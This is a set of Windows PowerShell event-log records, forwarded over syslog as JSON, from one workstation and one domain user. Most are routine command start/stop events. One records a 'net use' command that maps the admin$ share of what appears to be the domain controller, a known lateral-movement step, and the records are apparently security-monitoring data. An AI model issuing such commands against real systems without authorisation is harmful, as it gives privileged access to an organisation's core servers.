<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4323,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"out-lineoutput\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=59\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=9\r\n\tCommandName=out-lineoutput\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:36 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9590,"ActivityID":"{66883D06-FD3B-0000-2F70-28DDCE92D801}","ProcessID":2744,"ThreadID":6892,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: 0894491b-bd2d-41d4-96d0-62772118a110\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"0894491b-bd2d-41d4-96d0-62772118a110","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657287756,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4318,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Out-Default\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=53\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=8\r\n\tCommandName=Out-Default\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4327,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"format-default\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=63\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=9\r\n\tCommandName=format-default\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4322,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"prompt\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=58\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=9\r\n\tCommandName=prompt\r\n\tCommandType=Function\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=prompt","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4325,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"prompt\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=61\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=9\r\n\tCommandName=prompt\r\n\tCommandType=Function\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=prompt","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:36 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9593,"ActivityID":"{66883D06-FD3B-0000-6D70-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: 4e113efc-2626-45ba-9733-365b3a3c88c6\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"4e113efc-2626-45ba-9733-365b3a3c88c6","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657287756,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4312,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line: . \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=46\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=6\r\n\tScriptName=\r\n\tCommandLine= \r\n\r\nDetails: \r\nCommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:36 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9596,"ActivityID":"{66883D06-FD3B-0001-026C-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: 7936ed09-d2b5-4075-8e17-80e9ff8fa2e2\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"7936ed09-d2b5-4075-8e17-80e9ff8fa2e2","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657287756,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4311,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"PSConsoleHostReadLine\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=45\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=6\r\n\tCommandName=PSConsoleHostReadLine\r\n\tCommandType=Function\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:36 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9583,"ActivityID":"{66883D06-FD3B-0000-4870-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: 7936ed09-d2b5-4075-8e17-80e9ff8fa2e2\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"7936ed09-d2b5-4075-8e17-80e9ff8fa2e2","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657287756,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4326,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=62\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=9\r\n\tCommandName=\r\n\tCommandType=Script\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4317,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=52\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=8\r\n\tCommandName=\r\n\tCommandType=Script\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:36 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9594,"ActivityID":"{66883D06-FD3B-0000-6F70-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: 4e113efc-2626-45ba-9733-365b3a3c88c6\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"4e113efc-2626-45ba-9733-365b3a3c88c6","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657287756,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4331,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Set-StrictMode\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=67\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=10\r\n\tCommandName=Set-StrictMode\r\n\tCommandType=Cmdlet\r\n\tScriptName=C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\r\n\tCommandPath=\r\n\tCommandLine=    Microsoft.PowerShell.Core\\Set-StrictMode -Off\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4329,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Out-Default\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=65\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=9\r\n\tCommandName=Out-Default\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4314,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Out-Default\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=49\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=8\r\n\tCommandName=Out-Default\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4319,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line: . \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=54\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=8\r\n\tScriptName=\r\n\tCommandLine= \r\n\r\nDetails: \r\nCommandInvocation(Out-Default): \"Out-Default\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4313,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=48\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=8\r\n\tCommandName=\r\n\tCommandType=Script\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4315,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"net.exe\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=50\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=8\r\n\tCommandName=net.exe\r\n\tCommandType=Application\r\n\tScriptName=\r\n\tCommandPath=C:\\Windows\\system32\\net.exe\r\n\tCommandLine=net use g: \\\\activedir.stackedpads.local\\admin$","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4324,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"format-default\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=60\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=9\r\n\tCommandName=format-default\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:36 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9586,"ActivityID":"{66883D06-FD3B-0001-E66B-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: 1938a106-4933-4398-9f77-1ea8cd601559\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"1938a106-4933-4398-9f77-1ea8cd601559","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657287756,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4321,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Out-Default\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=57\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=9\r\n\tCommandName=Out-Default\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:36 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9587,"ActivityID":"{66883D06-FD3B-0001-E76B-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: 1938a106-4933-4398-9f77-1ea8cd601559\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"1938a106-4933-4398-9f77-1ea8cd601559","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657287756,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
